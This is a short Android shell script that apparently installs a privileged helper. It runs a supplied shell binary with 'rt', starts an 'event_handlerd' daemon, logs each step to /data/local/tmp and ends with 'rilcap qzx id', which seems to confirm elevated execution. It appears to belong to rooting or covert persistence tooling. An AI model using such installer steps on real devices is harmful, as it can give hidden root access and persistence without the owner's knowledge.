#!/system/bin/sh

# argv[1]: absolute new shell path
export LD_LIBRARY_PATH=/vendor/lib:/system/lib
export PATH=$PATH:/sbin:/vendor/bin:/system/sbin:/system/bin:/system/xbin

rm /data/local/tmp/inst.txt
date > /data/local/tmp/inst.txt
$1 rt &
echo "rt" >> /data/local/tmp/inst.txt
sleep 5
# Start the service
/system/bin/event_handlerd --daemon &
echo handlerd >> /data/local/tmp/inst.txt
sleep 5
echo finished >> /data/local/tmp/inst.txt
rilcap qzx id >> /data/local/tmp/inst.txt
